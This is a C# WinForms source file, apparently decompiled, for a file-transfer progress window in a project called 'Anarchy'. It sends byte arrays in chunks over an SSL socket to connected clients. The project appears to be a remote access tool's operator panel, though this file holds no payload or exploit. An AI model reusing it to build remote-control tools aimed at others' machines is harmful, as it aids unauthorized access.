using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Windows.Forms;
using Anarchy.Auth;
using Anarchy.Helpers.Helper;
using Anarchy.Networking;
using Guna.UI2.WinForms;
using ReaLTaiizor.Forms;

namespace Anarchy.Forms;

public class FormDownloadFile : Form
{
    public long FileSize;

    private long BytesSent;

    public string FullFileName;

    public string ClientFullFileName;

    private bool IsUpload;

    public string DirPath;

    private IContainer components;

    public Timer timer1;

    public Label labelsize;

    private Label label3;

    public Label labelfile;

    public Label label1;

    private HopeForm hopeForm1;

    private Guna2Elipse guna2Elipse1;

    public Form1 F { get; set; }

    internal Clients Client { get; set; }

    public FormDownloadFile()
    {
        this.InitializeComponent();
        base.StartPosition = FormStartPosition.Manual;
        base.Location = new Point(Screen.PrimaryScreen.Bounds.Width - base.Width, Screen.PrimaryScreen.Bounds.Height - base.Height);
    }

    private void timer1_Tick(object sender, EventArgs e)
    {
        if (this.FileSize >= 2147483647L)
        {
            this.timer1.Stop();
            MessageBox.Show("Don't support files larger than 2GB.");
            base.Dispose();
        }
        else if (!this.IsUpload)
        {
            this.labelsize.Text = Methods.BytesToString(this.FileSize) + " \\ " + Methods.BytesToString(this.Client.BytesRecevied);
            if (this.Client.BytesRecevied >= this.FileSize)
            {
                this.labelsize.Text = "Downloaded";
                this.labelsize.ForeColor = Color.Green;
                this.timer1.Stop();
            }
        }
        else
        {
            this.labelsize.Text = Methods.BytesToString(this.FileSize) + " \\ " + Methods.BytesToString(this.BytesSent);
            if (this.BytesSent >= this.FileSize)
            {
                this.labelsize.Text = "Uploaded";
                this.labelsize.ForeColor = Color.Green;
                this.timer1.Stop();
            }
        }
    }

    private void SocketDownload_FormClosed(object sender, FormClosedEventArgs e)
    {
        try
        {
            this.Client?.Disconnected();
            this.timer1?.Dispose();
        }
        catch
        {
        }
    }

    public void Send(object obj)
    {
        lock (this.Client.SendSync)
        {
            try
            {
                this.IsUpload = true;
                byte[] obj2;
                obj2 = (byte[])obj;
                byte[] bytes;
                bytes = BitConverter.GetBytes(obj2.Length);
                this.Client.TcpClient.Poll(-1, SelectMode.SelectWrite);
                this.Client.SslClient.Write(bytes, 0, bytes.Length);
                using (MemoryStream memoryStream = new MemoryStream(obj2))
                {
                    int num;
                    num = 0;
                    memoryStream.Position = 0L;
                    byte[] array;
                    array = new byte[50000];
                    while ((num = memoryStream.Read(array, 0, array.Length)) > 0)
                    {
                        this.Client.TcpClient.Poll(-1, SelectMode.SelectWrite);
                        this.Client.SslClient.Write(array, 0, num);
                        this.BytesSent += num;
                    }
                }
                Login.form1.BeginInvoke((MethodInvoker)delegate
                {
                    base.Close();
                });
            }
            catch
            {
                this.Client?.Disconnected();
                Login.form1.BeginInvoke((MethodInvoker)delegate
                {
                    this.labelsize.Text = "Error";
                    this.labelsize.ForeColor = Color.Red;
                });
            }
        }
    }

    private void FormDownloadFile_Load(object sender, EventArgs e)
    {
    }

    protected override void Dispose(bool disposing)
    {
        if (disposing && this.components != null)
        {
            this.components.Dispose();
        }
        base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
            this.components = new System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(FormDownloadFile));
            this.label1 = new System.Windows.Forms.Label();
            this.timer1 = new System.Windows.Forms.Timer(this.components);
            this.labelsize = new System.Windows.Forms.Label();
            this.label3 = new System.Windows.Forms.Label();
            this.labelfile = new System.Windows.Forms.Label();
            this.hopeForm1 = new ReaLTaiizor.Forms.HopeForm();
            this.guna2Elipse1 = new Guna.UI2.WinForms.Guna2Elipse(this.components);
            this.SuspendLayout();
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label1.Location = new System.Drawing.Point(23, 103);
            this.label1.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(66, 15);
            this.label1.TabIndex = 0;
            this.label1.Text = "Download:";
            // 
            // timer1
            // 
            this.timer1.Interval = 1000;
            this.timer1.Tick += new System.EventHandler(this.timer1_Tick);
            // 
            // labelsize
            // 
            this.labelsize.AutoSize = true;
            this.labelsize.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.labelsize.Location = new System.Drawing.Point(84, 103);
            this.labelsize.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelsize.Name = "labelsize";
            this.labelsize.Size = new System.Drawing.Size(13, 15);
            this.labelsize.TabIndex = 0;
            this.labelsize.Text = "..";
            // 
            // label3
            // 
            this.label3.AutoSize = true;
            this.label3.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label3.Location = new System.Drawing.Point(23, 54);
            this.label3.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.label3.Name = "label3";
            this.label3.Size = new System.Drawing.Size(30, 15);
            this.label3.TabIndex = 0;
            this.label3.Text = "File:";
            // 
            // labelfile
            // 
            this.labelfile.AutoSize = true;
            this.labelfile.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.labelfile.Location = new System.Drawing.Point(84, 54);
            this.labelfile.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelfile.Name = "labelfile";
            this.labelfile.Size = new System.Drawing.Size(13, 15);
            this.labelfile.TabIndex = 0;
            this.labelfile.Text = "..";
            // 
            // hopeForm1
            // 
            this.hopeForm1.ControlBoxColorH = System.Drawing.Color.FromArgb(((int)(((byte)(228)))), ((int)(((byte)(231)))), ((int)(((byte)(237)))));
            this.hopeForm1.ControlBoxColorHC = System.Drawing.Color.FromArgb(((int)(((byte)(245)))), ((int)(((byte)(108)))), ((int)(((byte)(108)))));
            this.hopeForm1.ControlBoxColorN = System.Drawing.Color.Black;
            this.hopeForm1.Cursor = System.Windows.Forms.Cursors.Default;
            this.hopeForm1.Dock = System.Windows.Forms.DockStyle.Top;
            this.hopeForm1.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.hopeForm1.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
            this.hopeForm1.Image = null;
            this.hopeForm1.Location = new System.Drawing.Point(0, 0);
            this.hopeForm1.MaximizeBox = false;
            this.hopeForm1.MinimizeBox = false;
            this.hopeForm1.Name = "hopeForm1";
            this.hopeForm1.Size = new System.Drawing.Size(410, 40);
            this.hopeForm1.TabIndex = 1;
            this.hopeForm1.Text = "Anarchy | Download";
            this.hopeForm1.ThemeColor = System.Drawing.Color.White;
            // 
            // guna2Elipse1
            // 
            this.guna2Elipse1.BorderRadius = 15;
            this.guna2Elipse1.TargetControl = this;
            // 
            // FormDownloadFile
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.White;
            this.ClientSize = new System.Drawing.Size(410, 142);
            this.Controls.Add(this.hopeForm1);
            this.Controls.Add(this.labelfile);
            this.Controls.Add(this.labelsize);
            this.Controls.Add(this.label3);
            this.Controls.Add(this.label1);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
            this.Margin = new System.Windows.Forms.Padding(2);
            this.MaximizeBox = false;
            this.MaximumSize = new System.Drawing.Size(1920, 1080);
            this.MinimizeBox = false;
            this.MinimumSize = new System.Drawing.Size(190, 40);
            this.Name = "FormDownloadFile";
            this.ShowIcon = false;
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterParent;
            this.Text = "`";
            this.FormClosed += new System.Windows.Forms.FormClosedEventHandler(this.SocketDownload_FormClosed);
            this.Load += new System.EventHandler(this.FormDownloadFile_Load);
            this.ResumeLayout(false);
            this.PerformLayout();

    }
}